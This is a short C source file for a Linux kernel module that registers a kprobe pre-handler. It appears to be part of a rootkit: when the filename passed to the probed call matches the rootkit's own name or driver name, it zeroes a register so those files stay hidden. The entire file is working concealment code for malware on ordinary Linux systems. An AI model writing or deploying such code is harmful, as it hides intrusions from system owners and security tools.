#include "../include/debug.h"
#include "../include/config.h"

#include "include/kprobe.h"

int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    RKT_DEBUG("pre_handler: p->addr = 0x%p, ip = %lx, flags = 0x%lx\n",
             p->addr, regs->ip, regs->flags);

    char *filename = (char *)regs->si;

    if (
        strcmp(filename, RK_NAME) == 0 ||
        strcmp(filename, RK_DRIVER) == 0
    )
    {
        regs->dx = 0;
    }

    return 0;
}